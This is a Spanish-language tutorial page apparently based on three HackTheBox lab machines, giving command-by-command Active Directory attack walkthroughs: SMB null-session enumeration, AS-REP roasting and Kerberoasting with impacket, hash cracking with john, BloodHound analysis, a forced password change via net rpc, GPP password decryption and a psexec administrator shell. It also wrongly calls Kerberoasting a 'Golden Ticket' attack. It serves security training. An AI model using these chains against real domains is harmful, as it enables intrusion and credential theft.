---
icon: file-lines
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Active Directory Hacking (Practicas-Teoria)

En esta practica habra 3 maquinas explicativas para entrar un poco en el entorno de `Active Directory` y las diferentes herramientas y formas de las cuales se puede aprovechar paar vulnerar una maquina.

## <mark style="color:purple;">Ejemplo 1 (Practica Maquina)</mark>

Haciendo un `nmap` imaginemos que nos encontramos los siguientes puertos.

```
53 = domain (DNS)
88 = kerberos-sec
135 = msrpc (RPC)
139 = tcpwrapped
389 = ldap (Domain: BLACKFIELD.local0...)
445 = microsoft-ds? (SMB)
593 = ncacn_http (RPC)
3268 = ldap (Domain: BLACKFIELD.local0...)
5985 = http (Servidor)
```

Entre estos puertos algunos son indiferentes, pero otros pueden ser vulnerables si nos estan bien configurados. (Estos puertos ya nos indican que estamos bajo un `Active Directory`)

### Dominio

Vemos que en los `ldap` `nmap` encontro el domino bajo el que esta sujeto el servidor de `Active Directory` llamado `BLACKFIELD.local`, por lo que de primeras esto lo meteremos en nuestro archivo `hosts`.

```shell
nano /etc/hosts

#Dentro del nano
<IP_VICTIM>          BLACKFIELD.local
```

Lo guardamos y si probamos a hacer un `ping` veremos que funciona:

```shell
ping BLACKFIELD.local
```

Tambien nos indica el `ttl` que es de `127` por lo que nos enfrentamos a una maquina `Windows`.

### Enumeración de SMB

Por lo que vimos antes, encontramos un puerto `445` que este se corresponde al `SMB` donde pueden haber recursos compartidos de la maquina victima y donde podremos obtener alguna informacion delicada a lo mejor, por lo que escanearemos ese puerto de la siguiente forma:

```shell
smbclient -L <IP_VICTIM> -N
```

`-N` = NullSesion (Escanear sin credenciales previas)

Y si esta mal configurado podremos ver los recursos compartidos de la maquina, pongamos que esta mal configurado y los podremos ver, habra algunos por defecto que ya vienen y otros que algun usuario o administrador habra creado de forma manual, pero si queremos ver donde tenemos permisos para entrar de forma sin ser autenticados, podremos hacerlo con la siguiente herramienta:

```shell
smbmap -H <IP_VICTIM> -u ''
```

Pero pongamos que esta bien configuardo esa parte y no nos dice nada, tendremos que probar uno por uno hasta que en alguno te deje, imaginemos que el recurso compartido al que te deja entrar es el siguiente:

```
profiles$         Disk
```

Podremos entrar de la siguiente forma:

```shell
smbclient -U test \\\\<IP_VICTIM>\\profiles$\\
```

En el `-U` utilizamos un usuarios inventado, ya que anteriormente nos dejo listar sin usuarios, por lo que eso funcionara.

Nos pedira una password, pero si lo dejamos en blanco dandole a `ENTER` entraremos igualmente.

Una vez dentro si listamos los archivos, pongamos que vemos muchos archivos entorno a 314 archivos con nombres simplemente, probaremos a guardarnos esos nombres y crear un diccionario de usuarios para probar, por lo que haremos lo siguiente.

Copiaremos todo y nos saldremos, en nuestra maquina atacante:

```shell
nano users.txt

#Dentro del nano
<CONTENT_USERNAMES>
```

Lo guardamos y si vemos la estructura estaria mal compuesta para tirarle un ataque, ya que hay lineas a la derecha que sobran, ya que se copio el contenido informativo de los nombres de usuario, por lo que podremos eliminar esa informacion que no queremos de la siguiente forma:

```shell
cat users.txt | awk '{print $1}' > usersUpdate.txt
```

`awk` = Filtrar columnas del archivo de texto

Con esto hacemos que solamente nos aparezca la primera fila, las demas se oculten y que se guarde en un archivo de texto nuevamente.

### Ataque ASREProast

Ahora si podremos efectuar el ataque `ASREProast` para con la lista de usuarios actualizada enumerar cuales son los usuarios que son vulnerables al `kerberos` y a la vez proporcionarnos su hash para posteriormente intentar crackearlo de la siguiente forma:

```shell
impacket-GetNPUsers BLACKFIELD.local/ -no-pass -usersfile usersUpdate.txt
```

Para saber si el usuario no tiene activada la autenticacion en `kerberos` por lo que seria vulnerable, se puede identificar cuando esta herramienta nos muestra una linea parecida a esto:

```
[-] User audit2020 doesn't have UF_DONT_REQUIRE_PREAUTH set
```

Pero con esto poca cosa podremos hacer, pero si nos muestra otra linea algo parecido a esto:

```
$krb5asrep$23$support$BLACKFIELD.local:<HASH_USER>...
```

Por lo que vemos el usuario llamado `support` no tiene establecida la autenticacion y a parte nos proporciona su hash por lo que es vulnerable a `kerberos` y a `ASREProast`.

Ahora copiaremos esa linea del hash entera desde el `$krb5asrep$23...` hasta el final del hash y lo pegaremos en un archivo llamado `hash`.

```shell
nano hash

#Dentro del nano
$krb5asrep$23$support$BLACKFIELD.local:<HASH_USER>
```

### Crackear hash de ASREProast

```shell
john --wordlist=<WORDLIST> hash
```

Si todo va bien esto nos crackeara el hash y nos mostrara la contraseña en texto plano, algo asi:

```
#00^BlackKnight ($krb5asrep$23$support$BLACKFIELD.local)
```

### Crackmapexec

Pongamos que la contraseña es esa, ahora veremos si esta contraseña es correcta para el usuario `support`:

```shell
crackmapexec smb <IP_VICTIM> -u support -p '#00^BlackKnight'
```

Y si al hacer esto nos devuelve un `[+]` seguido de lo que sea, significa que es correcta.

### smbmap Enumerar

Si con esas credenciales queremos enumerar recursos compartidos asociados a este usuario, podremos hacerlo de la siguiente forma:

```shell
smbmap -H <IP_VICTIM> -u 'support' -p '#00^BlackKnight'
```

Y esto nos devolvera la informacion pertinente de dichos recursos asociados a dicho usuario.

### evil-winrm

Tambien podriamos probar a entrar mediante `evil-winrm` a la maquina victima de la siguiente forma:

```shell
evil-winrm -i <IP_VICTIM> -u 'support' -p '#00^BlackKnight'
```

Pero pongamos que no tiene permiso para acceder de forma remota a la maquina con este usuario, por lo que podremos hacer lo siguiente...

### BloodHound y Neo4j

Instalaremos las herramientas, ya que no vienen preinstaladas en kali:

```shell
apt install bloodhound neo4j
```

Ahora inicializamos la base de datos haciendo lo siguiente:

```shell
neo4j console
```

Esto te dara informacion de donde esta corriendo ese servicio, tendras que ver algo como...

```
Remote interface available at http://localhost:7474/
```

Por lo que nos meteremos en nuestro navegador por esa `URL` y cambiaremos la contraseña, por defecto nos vendran las siguientes credenciales:

```
User = neo4j
Pass = neo4j
```

Se puede ejecutar `Bloodhound` de muchas formas, pero recomiendo hacerlo de la siguiente:

URL = [Pagina Bloodhound GitHub](https://github.com/dirkjanm/BloodHound.py)

Nos clonaremos ese repositorio a nuestro kali

```shell
git clone https://github.com/dirkjanm/BloodHound.py.git
cd BloodHound.py/
```

Y ahora ejecutaremos el `bloodhound` de la siguiente forma.

```shell
python3 bloodhound.py -u support -p '#00^BlackKnight' -ns <IP_VICTIM> -d blackfield.local -c all
```

`-ns` = La IP de la maquina victima `-d` = El dominio de la maquina victima que encontramos antes `-c` = Que nos busque absolutamente todo del dominio con dicho usuario

Ahora una vez obtenida esta informacion, abriremos la aplicacion de `bloodhound` en su version grafica, buscando en kali `bloodhound` (O en terminal poniendo solamente `bloodhound`) y se nos abrira un panel de login, meteremos las credenciales que configuramos anteriormente y nos metera en una pantalla en blanco, ahi es donde cargaremos dicha informacion que obtuvimos por terminal de la otra herramienta de `python3` de `bloodhound`.

Le daremos a `Upload data` y buscaremos la carpeta de `bloodhound.py` donde se encontraran varias carpetas con `.json` las cuales seleccionaremos todas ellas y le daremos a `Seleccionar`, esto lo que hara sera cargar toda la informacion del dominio para verlo todo de forma garfica y obtener informacion del mismo.

En la barra de busqueda buscaremos por el usuario `support` y esto nos creara un iconito en el `workspace` de `bloodhound`. (Para tenerlo de forma ordenada y no perdernos marcaremos a dicho usuario como `owner`, le daremos click derecho al icono de `support` -> `Mark User as Owner`)

Si nos vamos en la parte de `Analysis` y seleccionamos `Find all Domain Admins` se nos creara otro icono unido al icono del usuario `support` y con esto podremos saber tambien la informacion del grupo de administradores.

Si al darle a las opciones aparece algo es que si encontramos algo, pero si le damos y no aparece nada es que no hay nada.

Si nos vamos a la seccion de `Node info`, en la parte de `OUTBOUND OBJECT CONTROL` y clicamos `First Degree Object Control`, podremos ver que puede hacer el usuario `support` frente a otros usuarios, pongamos que nos aparece que este usuario puede cambiar la contraseña a un usuario llamado `audit2020`, sabiendo esto podremos hacer lo siguiente.

### Net rpc (Change Password)

Llendonos a la terminal, podremos cambiarle la contraseña al ese usuario de esta forma:

```shell
net rpc password audit2020 -U 'support' -S <IP_VICTIM>
```

Y esto nos pedira que ingresemos la nueva contraseña, pondremos lo que queramos, en mi caso pondre algo como `test$123`. (Para que la contraseña llegue a los requisitos minimos que pide)

Y seguidamente nos pedira que pongamos la contraseña del usuario `support` que seria `#00^BlackKnight`.

### smbmap (Enumeracion user audit2020)

Hecho esto podremos probar a enumerar los recursos compartidos del usuario `audit2020` de la siguiente forma.

```shell
smbmap -H <IP_VICTIM> -u 'audit2020' -p 'test$123'
```

Y veremos que funciona, nos da la informacion de los recursos compartidos.

Por lo que ya seria entrar mediante `evil-winrm` y escalar, etc...

## <mark style="color:purple;">Ejemplo 2 (Practica Maquina)</mark>

Si por ejemplo le tiramos un `nmap` y vemos que tiene puertos tipicos de `Active Directory` podremos hacer tecnicas similares a la anterior, pero imaginemos que no nos deja entrar por `SMB` con una `NullSesion` podremos enumerar el `SMB` desde esta herramienta:

```shell
enum4linux -a <IP_VICTIM>
```

Imaginemos que tenemos suerte y nos encuentra muchas cosas pero entre ellas, nos encuentra lo que parece una lista de usuarios con su `rid` (Ya que esto sucede cuando una maquina esta mal configurada), visto esto, nos copiaremos todos lo usuarios del dominio y los pegaremos en un archivo de texto.

```shell
nano users.txt

#Dentro del nano
<PASTE_USERS>
```

Pero al pegarlo viene con informacion demas, cosa que queremos quitar, lo podremos hacer de la siguiente forma:

```shell
cat users.txt | grep -v 'Mailbox' | tr -d '[]' | tr ':' ' ' | awk '{print $2}' | grep -v 'SM' > usersUpdate.txt
```

`grep -v 'Mailbox'` = Con esto estoy diciendo que quiero quitar aquellas lineas que contengan el patron de la palabra `Mailbox` `tr -d '[]'` = Con esto estoy haciendo es quitar los `[]` de cualquier linea que los tenga `tr ':' ' '` = Con esto lo que estoy haciendo es sustituir donde haya `:` por un espacio `awk '{print $2}'` = Con esto estoy haciendo que solo me imprima la columna numero 2 que es donde estan los usuarios (Ya que lo separamos con un espacio y se representa como columna numero 2)

Y todo esto lo pasaremos a un archivo llamado `usersUpdate.txt` el cual utilizaremos para hacer el ataque de `ASREProast`, por lo que miraremos bajo que dominio esta el `Active Directory` de la maquina (Servidor) y sabiendo esto podremos realizar el ataque.

### ASREProast Ataque

Pongamos que el dominio se llama `htb.local`, esto lo añadiremos a nuestro archivo `hosts`.

```shell
nano /etc/hosts

#Dentro del nano
<IP_VICTIM>        htb.local
```

Lo guardamos y realizaremos ahora si el ataque de la siguiente forma.

```shell
impacket-GetNPUsers htb.local/ -no-pass -usersfile usersUpdate.txt
```

Supongamos que nos encuentra un usuario que si es vulnerable algo como...

```
$krb5asrep$23$svc_alfresco$HTB.LOCAL:<HASH_USER>...
```

Vemos que encontro el hash del usuario `svc_alfresco`, por lo que intentaremos crackearlo.

Antes pegaremos el hash en un archivo de texto.

```shell
nano hash

#Dentro del nano
$krb5asrep$23$svc_alfresco$HTB.LOCAL:<HASH_USER>...
```

### Crackear hash de ASREProast

```shell
john --wordlist=<WORDLIST> hash
```

Si todo va bien esto nos crackeara el hash y nos mostrara la contraseña en texto plano, algo asi:

```
s3rvice ($krb5asrep$23$svc_alfresco$HTB.LOCAL)
```

### evil-winrm

Ahora teniendo unas credenciales, probaremos a conectarnos a la maquina mediante `evil-winrm`

```shell
evil-winrm -i <IP_VICTIM> -u 'svc_alfresco' -p 's3rvice'
```

Y vemos que si podremos entrar en este caso, ya que este usuario tiene activado el permiso de poder entrar de forma remota a la maquina.

Y ya seria escalar privilegios....

## <mark style="color:purple;">Ejemplo 3 (Practica Maquina)</mark>

Tirando un `nmap` nos descubrira varios puertos, veremos que estan relacionados con el `Active Directory` y tambien nos descubrira el dominio bajo el que esta sujeto llamado `active.htb`.

Por lo que lo añadiremos a nuestro archivo `hosts` de la siguiente forma:

```shell
nano /etc/hosts

#Dentro del nano
<IP_VICTIM>         active.htb
```

Lo guardamos y probaremos a listar los recursos compartidos de `SMB` con un `NullSesion` ya que hay un puerto `445` activo.

### SMB Enumeracion

```shell
smbclient -L <IP_VICTIM> -N
```

Y podremos listar los recursos compartidos de `SMB`, ahora veremos si nos deja ver los permisos de dichos recursos compartidos sin ninguna contraseña.

```shell
smbmap -H <IP_VICTIM>
```

Y en este caso si nos dejara, por lo que veremos que hay un recurso compartido con estas caracteristicas:

```
Replication           READ ONLY
```

Veremos que solo podemos leer el recurso compartido llamado `Replication` por lo que nos podremos conectar a el sin ningun tipo de autenticacion.

```shell
smbmap -H <IP_VICTIM> -r Replication
```

Y esto nos dara la informacion de lo que contiene dicho recurso compartido, imaginemos que vemos que hay un archivo llamado `./Replication` y un directorio llamado `active.htb`, por lo que veremos que contiene de la siguiente forma.

```shell
smbmap -H <IP_VICTIM> -r Replication/active.htb
```

Vemos que hay mas carpetas, por lo que ya tendriamos que ir una por una investigando.

Pero imaginemos que la ruta donde esta la posible vulnerabilidad es la siguiente:

```
Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups
```

Pues con el siguiente comando veremos que hay en `Groups`.

```shell
smbmap -H <IP_VICTIM> -r Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups
```

Vemos que hay un archivo bastante interesante llamado `groups.xml` por lo que nos lo descargaremos de la siguiente forma:

```shell
smbmap -H <IP_VICTIM> --download Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/groups.xml
```

Y esto lo que hara sera descargarnos el archivo en nuestro directorio actual.

vendria con un nombre muy largo, por lo que se lo podriamos cambiar con `mv` y se lo dejaremos en `groups.xml`

Y si vemos el contenido veremos que contiene politicas de grupo de un entorno de `Active Directory`, con esto suele ocurrir que suele venir algun hash de alguna contraseña que viene protegida y en este caso si viene con un hash que intentaremos crackear.

Pero tendremos que utilizar una herramienta especial para poder crackear contraseñas que se encuentren dentro del archivo `group.xml` de un entorno de `Active Directory`.

Por lo que antes nos instalaremos la herramienta:

```shell
apt install gpp-decrypt
```

Y la utilizaremos de la siguiente forma:

```shell
gpp-decrypt "<HASH_PASSWORD_groups.xml>"
```

Y esto nos devolvera como resultado la contraseña en texto plano desencriptada, que por ejemplo pongamos que seria esta:

```
GPPstillStandingStrong2k18
```

Y tambien tendriamos el usuario de dicha contraseña, ya que el nombre del usuario se encuentra dentro del archivo `groups.xml` que en este caso se llamara `SVC_TGS`

### Ataque Kerberoasting (Golden Ticket)

Teniendo las credenciales de un usuario, podremos probar a ejecutar un ataque llamado `KERBEROASTING` de `Active Directory` para obtener su `Golden Ticket` del administrador y asi obtener los maximos privilegios, por lo que haremos lo siguiente:

```shell
impacket-GetUserSPNs active.htb/SVC_TGS:GPPstillStandingStrong2k18 -request
```

Y con esto obtendriamos el hash `administrador` mediante la cuenta de `SVC_TGS`, que se veria algo asi:

```
$krb5tgs$23$*Administrator$ACTIVE.LOCAL$active.htb/Administrator*$<HASH_ADMIN>...
```

Por lo que copiaremos el hash entero y lo pegaremos en un archivo de texto:

```shell
nano hash

#Dentro del nano
$krb5tgs$23$*Administrator$ACTIVE.LOCAL$active.htb/Administrator*$<HASH_ADMIN>...
```

Lo guardamos y lo intentaremos crackear.

```shell
john --wordlist=<WORDLIST> hash
```

Si todo sale bien, deberiamos de poder crackearlo en tal caso de que sea una contarseña debil, se deberia de ver algo tal que asi:

```
Ticketmaster1968 (?)
```

Pongamos que esa es la contraseña del `Administrator`.

### psexec user admin

Por lo que teniendo la contraseña del administrador, nos conectaremos directamente desde la herramienta `psexec`.

```shell
impacket-psexec active.htb/Administrator:Ticketmaster1968@<IP_VICTIM> cmd.exe
```

Y con esto estariamos dentro como el usuario `administrador`.
